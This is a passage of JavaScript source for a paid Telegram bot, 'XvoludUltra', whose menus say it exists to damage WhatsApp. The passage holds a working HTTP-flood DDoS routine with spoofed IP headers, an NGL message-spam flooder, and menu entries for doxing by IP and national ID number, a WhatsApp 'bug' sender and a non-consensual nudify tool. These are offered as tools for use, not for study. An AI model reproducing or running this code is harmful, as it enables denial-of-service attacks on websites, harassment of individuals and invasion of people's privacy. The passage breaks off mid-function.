      replyMarkup = { inline_keyboard: [[{ text: "BACK", callback_data: "back_to_main", sryle: "danger" }]] };
    }
    
    if (query.data === "settings") {
      caption = `
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>
— ( 🐸 ) Olaa ${username}
Привет, пользователь XVOLUDULTRA, я телеграм-бот, созданный @XcovzOfficial, который предназначен для повреждения системы WhatsApp.

➤「 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐑𝐈𝐎𝐍 」
<tg-emoji emoji-id="5411301743738777449">🎩</tg-emoji>Developer  : @XcovzOfficial<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>    
<tg-emoji emoji-id="4949832238205240348">😄</tg-emoji>BotName  : XvoludUltra<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>
<tg-emoji emoji-id="4956726373679891220">🍽</tg-emoji>Version    : 20.0.1
<tg-emoji emoji-id="6097881360112816903">🗡</tg-emoji>Prefix   : Slash ( / ) 

╭───⊱<b>「 Settings Menu 」</b>
│⬡ /setcd 
│╰┈➤ control bug
│⬡ /connect 62xx
│╰┈➤ Add Sender Whatsapp
│⬡ /addadmin ID
│╰┈➤ Add Admin Users
│⬡ /deladmin ID
│╰┈➤ Delete Admin Users
│⬡ /addprem ID
│╰┈➤ Add Premium Users
│⬡ /delprem ID
│╰┈➤ Delete Premium Users
╰───────────────⊱

<b>XVOLUDULTRA VERSION 20</b>
`;
      replyMarkup = { inline_keyboard: [[{ text: "BACK", callback_data: "back_to_main", style: "danger" }]] };
    }

    if (query.data === "toolscoy") {
      caption = `
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>
— ( 🐸 ) Olaa ${username}
Привет, пользователь XVOLUDULTRA, я телеграм-бот, созданный @XcovzOfficial, который предназначен для повреждения системы WhatsApp.

➤「 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐑𝐈𝐎𝐍 」
<tg-emoji emoji-id="5411301743738777449">🎩</tg-emoji>Developer  : @XcovzOfficial<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>    
<tg-emoji emoji-id="4949832238205240348">😄</tg-emoji>BotName  : XvoludUltra<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>
<tg-emoji emoji-id="4956726373679891220">🍽</tg-emoji>Version    : 20.0.1
<tg-emoji emoji-id="6097881360112816903">🗡</tg-emoji>Prefix   : Slash ( / ) 

╭───⊱<b>「 Tools fiturs 」</b>
│⬡ /ddoswebsite « Url »
│╰┈➤ Attack Website ¡
│⬡ /fixcode « Reply Code »
│╰┈➤ Fixing Code Error ¡
│⬡ /play « Song Name »
│╰┈➤ Search Music ¡
│⬡ /ssiphone « Query »
│╰┈➤ Screenshot WhatsApp Ip ¡
│⬡ /addfiture « Reply Code »
│╰┈➤ Add New Fitures ¡
│⬡ /removebg « Reply Image »
│╰┈➤ Delete Baground Image ¡
╰───────────────⊱
    
<b>XVOLUDULTRA VERSION 20</b>
`;
      replyMarkup = { inline_keyboard: [
      [{ text: "BACK", callback_data: "back_to_main", style: "danger" }]] };
    }
    
     if (query.data === "tools_v3") {
      caption = `
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>
— ( 🐸 ) Olaa ${username}
Привет, пользователь XVOLUDULTRA, я телеграм-бот, созданный @XcovzOfficial, который предназначен для повреждения системы WhatsApp.

➤「 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐑𝐈𝐎𝐍 」
<tg-emoji emoji-id="5411301743738777449">🎩</tg-emoji>Developer  : @XcovzOfficial<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>    
<tg-emoji emoji-id="4949832238205240348">😄</tg-emoji>BotName  : XvoludUltra<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>
<tg-emoji emoji-id="4956726373679891220">🍽</tg-emoji>Version    : 20.0.1
<tg-emoji emoji-id="6097881360112816903">🗡</tg-emoji>Prefix   : Slash ( / ) 

╭───⊱<b>「 Tools Fiturs 」</b>
│⬡ /restart
│╰┈➤ Restart Bot Telegram ¡
│⬡ /update « Reply File »
│╰┈➤ Replacing The index.js File ¡
│⬡ /chatowner « Text »
│╰┈➤ Message Owner From Bot ¡
│⬡ /sticker « Reply Image »
│╰┈➤ Convert Image To Sticker ¡
│⬡ /watermark « Reply Image »
│╰┈➤ Adding Watermark to Photos ¡
│⬡ /tiktokdl « Url »
│╰┈➤ Download Media Tiktok ¡
│⬡ /instagramdl « Url »
│╰┈➤ Download Media Instagram ¡
│⬡ /pinterest « Query »
│╰┈➤ Search Image From Pinterest ¡
╰───────────────⊱
    
<b>XVOLUDULTRA VERSION 20</b>
`;
      replyMarkup = { inline_keyboard: [
      [{ text: "BACK", callback_data: "back_to_main", style: "danger" }]] };
    }
    
        if (query.data === "tools_v2") {
      caption = `
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>
— ( 🐸 ) Olaa ${username}
Привет, пользователь XVOLUDULTRA, я телеграм-бот, созданный @XcovzOfficial, который предназначен для повреждения системы WhatsApp.

➤「 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐑𝐈𝐎𝐍 」
<tg-emoji emoji-id="5411301743738777449">🎩</tg-emoji>Developer  : @XcovzOfficial<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>    
<tg-emoji emoji-id="4949832238205240348">😄</tg-emoji>BotName  : XvoludUltra<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>
<tg-emoji emoji-id="4956726373679891220">🍽</tg-emoji>Version    : 20.0.1
<tg-emoji emoji-id="6097881360112816903">🗡</tg-emoji>Prefix   : Slash ( / ) 

╭───⊱<b>「 Tools Fiturs 」</b>
│⬡ /getcode « Url »
│╰┈➤ Fetch HTML Code ¡
│⬡ /enchtml - Reply File
│╰┈➤ Locking HTML Code ¡
│⬡ /tourl « Reply Image »
│╰┈➤ Upload Image To Link ¡
│⬡ /brat « Text »
│╰┈➤ Sticker Brat ¡
│⬡ /tonaked « Reply Image »
│╰┈➤ To Naked Girls ¡
│⬡ /cekemoji « Reply Emoji premium »
│╰┈➤ cek emoji premium telegram ¡
╰───────────────⊱
<b>XVOLUDULTRA VERSION 20</b>
`;
      replyMarkup = { inline_keyboard: [
      [{ text: "BACK", callback_data: "back_to_main", style: "danger" }]] };
    }
    
      if (query.data === "doxingmenu") {
      caption = `
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>
— ( 🐸 ) Olaa ${username}
Привет, пользователь XVOLUDULTRA, я телеграм-бот, созданный @XcovzOfficial, который предназначен для повреждения системы WhatsApp.

➤「 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐑𝐈𝐎𝐍 」
<tg-emoji emoji-id="5411301743738777449">🎩</tg-emoji>Developer  : @XcovzOfficial<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>    
<tg-emoji emoji-id="4949832238205240348">😄</tg-emoji>BotName  : XvoludUltra<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>
<tg-emoji emoji-id="4956726373679891220">🍽</tg-emoji>Version    : 20.0.1
<tg-emoji emoji-id="6097881360112816903">🗡</tg-emoji>Prefix   : Slash ( / ) 

╭───⊱<b>「 Doxing 」</b>
│⬡ /trackip « IP Adress »
│╰┈➤ Search Information IP Adress ¡
│⬡ /nikparse « NIK »
│╰┈➤ Search Information NIK ¡
╰───────────────⊱
<b>XVOLUDULTRA VERSION 20</b>
`;
      replyMarkup = { inline_keyboard: [
      [{ text: "BACK", callback_data: "back_to_main", style: "danger" }]] };
    }
    
    if (query.data === "thanksto") {
      caption = `
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>
— ( 🐸 ) Olaa ${username}
Привет, пользователь XVOLUDULTRA, я телеграм-бот, созданный @XcovzOfficial, который предназначен для повреждения системы WhatsApp.

➤「 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐑𝐈𝐎𝐍 」
<tg-emoji emoji-id="5411301743738777449">🎩</tg-emoji>Developer  : @XcovzOfficial<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>    
<tg-emoji emoji-id="4949832238205240348">😄</tg-emoji>BotName  : XvoludUltra<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>
<tg-emoji emoji-id="4956726373679891220">🍽</tg-emoji>Version    : 20.0.1
<tg-emoji emoji-id="6097881360112816903">🗡</tg-emoji>Prefix   : Slash ( / ) 

<blockquote><b>𝐒𝐏𝐄𝐂𝐈𝐀𝐋 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎</b></blockquote>
<b>╭───⊱<b>「 Special Thanks To 」</b>
│⬡ @XcovzOfficial 
│╰┈➤ Developer
│⬡ @zyezaofficial 
│╰┈➤ Asisten
╰───────────────⊱</b>
`;
      replyMarkup = { inline_keyboard: [[{ text: "BACK", callback_data: "back_to_main", style: "danger" }]] };
    }
      
   if (query.data === "back_to_main") {

  await sendStartMenu(chatId, query.from);

  await bot.answerCallbackQuery(query.id);

  return;

}

if (caption !== "" && imageThumbnail !== "") {

  await bot.sendPhoto(chatId, imageThumbnail, {

    caption: caption,

    parse_mode: "HTML",

    reply_markup: replyMarkup

  });

  await bot.answerCallbackQuery(query.id);

}

} catch (error) {

  console.error("Error handling callback query:", error);

}

});
        
// ~ Connect
bot.onText(/\/connect (.+)/, async (msg, match) => {
const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To XcovzOfficial</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 OWNERS 」", url: "https://t.me/XcovzOfficial" }]
        ]
      }
    });
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ ⵢ Format :  /Connect 62xx.");
  }
  
  const botNumber = match[1].replace(/[^0-9]/g, "");

  if (!botNumber || botNumber.length < 10) {
    return bot.sendMessage(chatId, "❌ ⵢ Nomor yang diberikan tidak valid. Pastikan nomor yang dimasukkan benar.");
  }

  try {
    await ConnectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in Connect:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

// ~ Group Menu
const data = {}

function ensure(chatId) {
  if (!data[chatId]) {
    data[chatId] = {
      welcome: { enabled: true, text: "Selamat datang {name}!", photo: null },
      rules: "Belum ada rules.",
      warns: {},
      blocklist: []
    }
  }
}

function parseDurationToSeconds(s) {
  if (!s) return null
  const m = s.match(/^(\d+)(s|m|h|d)$/i)
  if (!m) return null
  const n = parseInt(m[1], 10)
  const u = m[2].toLowerCase()
  if (u === "s") return n
  if (u === "m") return n * 60
  if (u === "h") return n * 3600
  if (u === "d") return n * 86400
  return null
}

bot.onText(/^\/pin$/i, async (msg) => {
  const chatId = msg.chat.id
  const reply = msg.reply_to_message
  const fromId = msg.from.id
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }
  try {
    await bot.pinChatMessage(chatId, reply.message_id)
    await bot.sendMessage(chatId, "Pinned!", { reply_markup: { inline_keyboard: [[{ text: "Unpin Message", callback_data: "unpin" }]] } })
  } catch { await bot.sendMessage(chatId, "Gagal pin") }
})
// ~ Tools And Fun Menu
bot.onText(/^\/update$/, async (msg) => {
  const chatId = msg.chat.id
  const userId = msg.from.id

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendVideo(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To XcovzOfficial</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 OWNERS 」", url: "https://t.me/XcovzOfficial" }]
        ]
      }
    });
  }

  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(chatId, "❌ ⵢ Balas ke file .js atau package.json yang ingin diupdate, lalu kirim /update")
  }

  const file = msg.reply_to_message.document
  const fileName = file.file_name

  if (!fileName.endsWith(".js") && fileName !== "package.json") {
    return bot.sendMessage(chatId, "❌ ⵢ File harus berekstensi .js atau bernama package.json")
  }

  try {
    const fileLink = await bot.getFileLink(file.file_id)
    const filePath = path.join(__dirname, fileName)

    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath)
      bot.sendMessage(chatId, `🗑️ ⵢ Old Files *${fileName}* Delete.`, { parse_mode: "Markdown" })
    }

    const fileStream = fs.createWriteStream(filePath)
    https.get(fileLink, (response) => {
      response.pipe(fileStream)
      fileStream.on("finish", () => {
        fileStream.close()
        bot.sendMessage(chatId, `✅ ⵢ File *${fileName}* Updated !`, { parse_mode: "Markdown" })
        if (fileName === "Xcovz.js" || fileName === "package.json") {
          bot.sendMessage(chatId, `♻️ ⵢ File penting diperbarui (${fileName}) — Bot akan restart...`, { parse_mode: "Markdown" })
          setTimeout(() => {
            exec("pm2 restart all || npm restart || node Xcovz.js", (err) => {
              if (err) console.error("Gagal restart bot:", err.message)
            })
          }, 2000)
        }
      })
    }).on("error", (err) => {
      bot.sendMessage(chatId, `❌ ⵢ Gagal mengunduh file: ${err.message}`)
    })
  } catch (err) {
    bot.sendMessage(chatId, `❌ ⵢ Terjadi kesalahan: ${err.message}`)
  }
})

bot.onText(/^\/ddoswebsite(?:\s+(.+))?$/i, async (msg, match) => {
  try {
  const args = (msg.text || "").split(" ").slice(1).join(" ").trim();
    if (!args) {
      return bot.sendMessage(msg.chat.id, "❌ ⵢ Format: /ddoswebsite https://target.com 1000");
    }

    const [target_url, rawThreads] = args.split(" ");
    const threads = parseInt(rawThreads) || 50;

    const processMsg = await bot.sendMessage(msg.chat.id, `<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>
╭───⊱
│⬡ Target
│╰┈➤  ${target_url}
│⬡ Threads
│╰┈➤  ${threads}
│⬡ Status
│╰┈➤  Process
╰───────────────⊱
`, { parse_mode: "HTML" });

    const attackConfig = {
      threads: threads,
      duration: 60000,
      requestsPerThread: 1000,
      userAgents: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36"
      ],
      methods: ["GET", "POST", "HEAD", "OPTIONS"]
    };

    let totalRequests = 0;
    let successfulAttacks = 0;
    const startTime = Date.now();

    const attackPromises = [];

    for (let i = 0; i < attackConfig.threads; i++) {
      attackPromises.push(new Promise(async (resolve) => {
        let threadRequests = 0;
        
        while (Date.now() - startTime < attackConfig.duration && threadRequests < attackConfig.requestsPerThread) {
          try {
            const method = attackConfig.methods[Math.floor(Math.random() * attackConfig.methods.length)];
            const userAgent = attackConfig.userAgents[Math.floor(Math.random() * attackConfig.userAgents.length)];
            const ip = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

            const headers = {
              "X-Forwarded-For": ip,
              "X-Real-IP": ip,
              "User-Agent": userAgent,
              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              "Connection": "keep-alive",
              "Upgrade-Insecure-Requests": "1",
              "Cache-Control": "no-cache",
              "Pragma": "no-cache"
            };

            const randomPaths = ["/", "/admin", "/wp-admin", "/api", "/test", "/debug"];
            const randomPath = randomPaths[Math.floor(Math.random() * randomPaths.length)];
            const attackUrl = target_url + randomPath;

            const response = await axios({
              method: method,
              url: attackUrl,
              headers: headers,
              timeout: 5000,
              validateStatus: () => true
            });

            totalRequests++;
            threadRequests++;
            
            if (response.status < 500) {
              successfulAttacks++;
            }

            if (totalRequests % 100 === 0) {
              const elapsed = Math.floor((Date.now() - startTime) / 1000);
              await bot.editMessageText(
                `<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>
╭───⊱      
│⬡ Target
│╰┈➤  ${target_url}
│⬡ Threads
│╰┈➤  ${attackConfig.threads}
│⬡ Requests
│╰┈➤  ${totalRequests}
│⬡ Success
│╰┈➤  ${successfulAttacks}
│⬡ Duration
│╰┈➤  ${elapsed}s
│⬡ Status
│╰┈➤  Running
╰───────────────⊱
`,
                {
                  chat_id: msg.chat.id,
                  message_id: processMsg.message_id,
                  parse_mode: "HTML"
                }
              );
            }

            await new Promise(r => setTimeout(r, Math.random() * 100));

          } catch (error) {
            threadRequests++;
            totalRequests++;
          }
        }
        resolve();
      }));
    }

    await Promise.all(attackPromises);

    const endTime = Date.now();
    const totalDuration = Math.floor((endTime - startTime) / 1000);

    await bot.editMessageText(
      `<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>
╭───⊱
│⬡ Target
│╰┈➤  ${target_url}
│⬡ Threads
│╰┈➤  ${attackConfig.threads}
│⬡ Total Requests
│╰┈➤  ${totalRequests}
│⬡ Successful
│╰┈➤  ${successfulAttacks}
│⬡ Total Duration
│╰┈➤  ${totalDuration}s
│⬡ Requests/Sec
│╰┈➤  ${Math.floor(totalRequests / totalDuration)}
│⬡ Status
│╰┈➤  Completed
╰───────────────⊱
`,
      {
        chat_id: msg.chat.id,
        message_id: processMsg.message_id,
        parse_mode: "HTML"
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, "❌ ⵢ Gagal melakukan serangan ddos" + error);
  }
});

bot.onText(/^\/broadcast(?:\s+([\s\S]+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const text = match[1];

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To XcovzOfficial</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 OWNERS 」", url: "https://t.me/XcovzOfficial" }]
        ]
      }
    });
  }

  if (!text) {
    return bot.sendMessage(chatId, "Gunakan format:\n`/broadcast <pesan>`", { parse_mode: "Markdown" });
  }

  await bot.sendMessage(chatId, `Mengirim Pesan ke ${users.size} pengguna...`, { parse_mode: "Markdown" });

  let success = 0;
  let fail = 0;

  for (const userId of users) {
    try {
      await bot.sendMessage(userId, `
<blockquote>Broadcast From Admin [ ⬡ ]</blockquote>
#- Message : ${text}`, { parse_mode: "HTML" });
      success++;
    } catch {
      fail++;
    }
  }

  await bot.sendMessage(chatId, `Pesan selesai!\n\nTerkirim: ${success}\nGagal: ${fail}`);
});

bot.onText(/^\/chatowner (.+)/, async (msg, match) => {
  const text = match[1];
  bot.sendMessage(OWNER_ID, "From User:\n" + text)
  bot.sendMessage(msg.chat.id, "Succes Chat Owner !.")
})

async function getFileBuffer(fileId, bot) {
  const link = await bot.getFileLink(fileId)
  const res = await axios.get(link, { responseType: "arraybuffer" })
  return Buffer.from(res.data)
}

async function getFileUrl(fileId) {
  const file = await bot.getFile(fileId)
  return `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`
}

async function downloadToFile(fileUrl, outPath) {
  const res = await axios.get(fileUrl, { responseType: "stream", timeout: 120000 })
  await streamPipeline(res.data, fs.createWriteStream(outPath))
  return outPath
}

async function downloadBuffer(fileUrl) {
  const res = await axios.get(fileUrl, { responseType: "arraybuffer", timeout: 120000 })
  return Buffer.from(res.data)
}

function tmpPath(ext = "") {
  return path.join(process.cwd(), "tmp_" + uuidv4() + (ext ? ("." + ext) : ""))
}

async function getMediaFromMessage(msg) {
  if (msg.photo) {
    const p = msg.photo[msg.photo.length - 1]
    return { type: "photo", fileId: p.file_id }
  }
  if (msg.video) {
    return { type: "video", fileId: msg.video.file_id }
  }
  if (msg.document && msg.document.mime_type && msg.document.mime_type.startsWith("image")) {
    return { type: "document", fileId: msg.document.file_id }
  }
  if (msg.reply_to_message) {
    const rm = msg.reply_to_message
    if (rm.photo) {
      const p = rm.photo[rm.photo.length - 1]
      return { type: "photo", fileId: p.file_id }
    }
    if (rm.video) {
      return { type: "video", fileId: rm.video.file_id }
    }
    if (rm.document && rm.document.mime_type && rm.document.mime_type.startsWith("image")) {
      return { type: "document", fileId: rm.document.file_id }
    }
  }
  return null
}

async function upscaleSharp(buffer, scale = 2) {
  const img = sharp(buffer)
  const meta = await img.metadata()
  const width = meta.width ? Math.round(meta.width * scale) : null
  if (!width) return null
  const out = await img.resize({ width, withoutEnlargement: false, kernel: sharp.kernel.lanczos3 }).toBuffer()
  return out
}

async function makeSticker(buffer) {
  const out = await sharp(buffer).resize(512, 512, { fit: "cover" }).webp().toBuffer()
  return out
}

async function addWatermark(buffer, text) {
  const meta = await sharp(buffer).metadata()
  const svg = `<svg width="${meta.width}" height="${meta.height}"><style>.a{fill:white;font-size:48px;font-weight:700;stroke:black;stroke-width:2px;}</style><text x="${Math.max(10, Math.floor(meta.width*0.02))}" y="${meta.height - Math.max(10, Math.floor(meta.height*0.02))}" class="a">${text}</text></svg>`
  const out = await sharp(buffer).composite([{ input: Buffer.from(svg), gravity: "southeast" }]).toBuffer()
  return out
}

function downloadFile(url, outputPath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(outputPath)
    https.get(url, (res) => {
      res.pipe(file)
      file.on("finish", () => file.close(() => resolve(true)))
    }).on("error", (err) => {
      fs.unlinkSync(outputPath)
      reject(err)
    })
  })
}

bot.on("message", async msg => {
  try {
    const chatId = msg.chat.id
    const textRaw = (msg.text || msg.caption || "").trim()
    if (!textRaw) return
    const parts = textRaw.split(" ")
    const cmd = parts[0].toLowerCase()
    const arg = parts.slice(1).join(" ").trim()
    const media = await getMediaFromMessage(msg)
    
   if (msg.text === "/removebg") {
    return bot.sendMessage(chatId, "❌ ⵢ Format : Reply Media Dengan Caption /removebg")
  }

  if (msg.photo) {
    try {
      const fileId = msg.photo[msg.photo.length - 1].file_id
      const file = await bot.getFile(fileId)

      const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`
      const inputPath = "input_removebg.png"
      const outputPath = "removebg_result.png"

      await downloadFile(fileUrl, inputPath)

      await sharp(inputPath)
        .removeAlpha()
        .threshold(200)
        .png()
        .toFile(outputPath)

      await bot.sendPhoto(chatId, outputPath, {
        caption: "✅ ⵢ Remove Bg By XcovzOfficial ( 🍁 )"
      })

      fs.unlinkSync(inputPath)
      fs.unlinkSync(outputPath)

    } catch(e) {
      bot.sendMessage(chatId, "❌ ⵢ Terjadi error saat memproses foto." + e)
    }
  }
    if (cmd === "/sticker" || cmd === "/stiker") {
      if (!media) {
        await bot.sendMessage(chatId, "❌ ⵢ Format : Reply Media / Kirim Media Dengan Caption /sticker")
        return
      }
      const fileUrl = await getFileUrl(media.fileId)
      const buf = await downloadBuffer(fileUrl)
      const webp = await makeSticker(buf)
      await bot.sendSticker(chatId, webp)
      return
    }
    if (cmd === "/watermark" || cmd === "/wm") {
      if (!arg) {
        await bot.sendMessage(chatId, "Tambahkan teks watermark setelah perintah, contoh: /watermark zellx")
        return
      }
      if (!media) {
        await bot.sendMessage(chatId, "❌ ⵢ Format : Reply Media / Kirim Media Dengan Caption /watermark teks")
        return
      }
      const fileUrl = await getFileUrl(media.fileId)
      const buf = await downloadBuffer(fileUrl)
      const out = await addWatermark(buf, arg)
      await bot.sendPhoto(chatId, out)
      return
    }
  } catch (e) {
    try { await bot.sendMessage(msg.chat.id, "Terjadi kesalahan saat memproses") } catch {}
  }
})

const MAIN_FILE = "./Xcovz.js";

bot.onText(/^\/addfiture$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const messageId = msg.message_id;
  
  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To XcovzOfficial</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 OWNERS 」", url: "https://t.me/XcovzOfficial" }]
        ]
      }
    });
  }

  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, "❌ ⵢ Reply ke case text atau file .js yang ingin ditambahkan.");
  }

  let newCase = "";

  if (msg.reply_to_message.text) {
    newCase = msg.reply_to_message.text;
  }

  if (msg.reply_to_message.document) {
    const file = await bot.getFile(msg.reply_to_message.document.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
    const res = await fetch(fileUrl);
    newCase = await res.text();
  }

  if (!newCase) {
    return bot.sendMessage(chatId, "❌ ⵢ Gagal mendapatkan case dari reply.");
  }

  try {
    const appendText = `\n\n${newCase}\n`;
    fs.appendFileSync(MAIN_FILE, appendText, "utf8");

    await bot.sendMessage(chatId, "✅ ⵢ Case berhasil ditambahkan ke Xcovz.js!\nPlease Type /restart.", {
      reply_to_message_id: messageId
    });

  } catch (err) {
    bot.sendMessage(chatId, "⚠️ ⵢ Terjadi kesalahan: " + err.message);
  }
});

bot.onText(/^\/spamngl(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const args = match[1] ? match[1].split(" ") : [];

  try {
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Premium Acces</b>
<b>Please Buy Acces To XcovzOfficial</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 OWNERS 」", url: "https://t.me/XcovzOffc" }]
        ]
      }
    });
  }
  
    if (args.length < 1) {
      return bot.sendMessage(chatId, "❌ ⵢ Format: /spamngl XcovzOfficial 10");
    }

    const username = args[0];
    const amount = parseInt(args[1], 10);
    const delay = 200;

    if (isNaN(amount) || amount < 1) {
      return bot.sendMessage(chatId, "❌ ⵢ Masukkan jumlah dan harus berupa angka!");
    }

    await bot.sendMessage(chatId, `⏳ Mengirim ${amount} pesan spam ke ${username}`);

    for (let i = 1; i <= amount; i++) {
      try {
        const deviceId = crypto.randomBytes(21).toString("hex");
        const message = "Who's Xcovz?";
        const body = `username=${username}&question=${encodeURIComponent(message)}&deviceId=${deviceId}`;

        await fetch("https://ngl.link/api/submit", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
          },
          body,
        });
      } catch (err) {
        console.error(`Error kirim ke-${i}:`, err.message);
      }

      if (i < amount) {
        if (i % 50 === 0) {
          await new Promise((r) => setTimeout(r, delay + 200));
        } else {
          await new Promise((r) => setTimeout(r, delay));
        }
      }
    }

    bot.sendMessage(chatId, `✅ ⵢ Selesai mengirim ${amount} pesan spam ke ${username}`);
  } catch (error) {
    console.error("Error utama:", error);
    bot.sendMessage(chatId, "❌ ⵢ Gagal menghubungi API, coba lagi nanti.");
  }
});

// cek emoji
bot.onText(/\/cekemoji/, async (msg) => {
  const chatId = msg.chat.id;
  const targetMsg = msg.reply_to_message;

  // wajib reply pesan
  if (!targetMsg) {
    return bot.sendMessage(
      chatId,
      `
<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> <b>Reply pesan yang berisi emoji premium.</b>

<b>Contoh:</b>
• User kirim emoji premium  
• Reply pesan tersebut dengan command <code>/cekemoji</code>
      `,
      {
        parse_mode: "HTML",
      }
    );
  }

  const emojis = [];

  // ambil dari text entities
  if (targetMsg.entities) {
    targetMsg.entities.forEach((entity) => {
      if (entity.type === "custom_emoji") {
        emojis.push(entity.custom_emoji_id);
      }
    });
  }

  // ambil dari caption entities
  if (targetMsg.caption_entities) {
    targetMsg.caption_entities.forEach((entity) => {
      if (entity.type === "custom_emoji") {
        emojis.push(entity.custom_emoji_id);
      }
    });
  }

  // hapus duplikat
  const uniqueEmojis = [...new Set(emojis)];

  if (uniqueEmojis.length === 0) {
    return bot.sendMessage(
      chatId,
      `
<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> <b>Tidak ada custom emoji terdeteksi.</b>

Gunakan command ini dengan reply ke pesan yang berisi emoji premium Telegram.
      `,
      {
        parse_mode: "HTML",
      }
    );
  }

  let result = `
<blockquote><b>
<tg-emoji emoji-id="5289594654176606759">✨</tg-emoji>
<tg-emoji emoji-id="5287412269624358128">✨</tg-emoji>
<tg-emoji emoji-id="5289864047410314050">✨</tg-emoji>
<tg-emoji emoji-id="5290014366970706894">✨</tg-emoji>

╔══════════════════╗
   CUSTOM EMOJI FOUND
╚══════════════════╝
</b></blockquote>
`;

  uniqueEmojis.forEach((id, i) => {
    result += `
